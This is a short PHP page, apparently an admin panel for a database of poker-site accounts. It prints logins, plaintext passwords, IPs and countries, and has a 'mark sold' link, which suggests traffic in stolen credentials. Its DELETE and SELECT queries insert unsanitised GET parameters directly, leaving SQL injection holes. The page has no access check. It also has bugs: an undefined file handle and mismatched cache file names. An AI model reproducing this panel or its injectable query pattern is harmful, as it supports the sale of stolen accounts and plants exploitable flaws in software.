<html>
<head>
<title>TNT-NETS :: БД клиентов</title>
<meta http-equiv="content-type" content="text/html; charset=windows-1251">
</head>
<body>

<?php
include("bdconfig.php");

////////// УДАЛЯЕМ  ЮЗЕРА /////////////////////////

$Link=mysql_connect($Host,$User,$Password);
mysql_query("SET NAMES cp1251");

if($_GET[del_id]!="") // && $_SESSION[debug]==1
{
     $Query = "DELETE FROM $Table_Poker WHERE id=$_GET[del_id]";
     $Result=mysql_db_query ($DBName, $Query, $Link);
}

     if($_GET[country]!="")
     $Query = "SELECT * from $Table_Poker WHERE CCOUNTRY='$_GET[country]'  order by id LIMIT 0,50";
     else
     $Query = "SELECT * from $Table_Poker order by id  LIMIT 0,50";

     $Result=mysql_db_query ($DBName, $Query, $Link);     
     print "<h2>Наши партнеры</h2>";

     print "<a href='?country='>Сделать выборку</a> | ";
     print "<a href='?country='>Пометить проданные</a> | ";
     print "<a href='?refresh=1'>Обновить счетчики</a>";
     print "<br><br>";

     if($_GET[refresh]=="1")
     {
     $f=file('countrys.txt');

     $ff1=fopen('cs1.txt',"w");
     $ff2=fopen('cs2.txt',"w");

     print "<a href='?country='>All</a> | ";

     for($i=0;$i<count($f);$i++)
     {
           $s=$f[$i];
           $s=substr($s,0,strlen($s)-2);
           $Query2 = "SELECT COUNT(*) FROM $Table_Poker WHERE CCOUNTRY='$s' ";
           $Result2=mysql_db_query ($DBName, $Query2, $Link);
           $Row2=mysql_fetch_array ($Result2);
           $xxxxx="<a href='?country=$s'>$s ($Row2[0])</a> | ";

           print $xxxxx;       
           fputs($ff,$xxxxx);
     }
     }
     else
     {
	$x=file_get_contents('cs.txt');
	echo $x;
     }


     print "<br><br><textarea rows=50 cols=80>";  
     while($Row=mysql_fetch_array ($Result)) 
     {
	print "$Row[CLOGIN]:$Row[CPASS]:$Row[CIP]:$Row[CCOUNTRY]\r\n";
     }
     print "</textarea>";



?>

</body>
</html>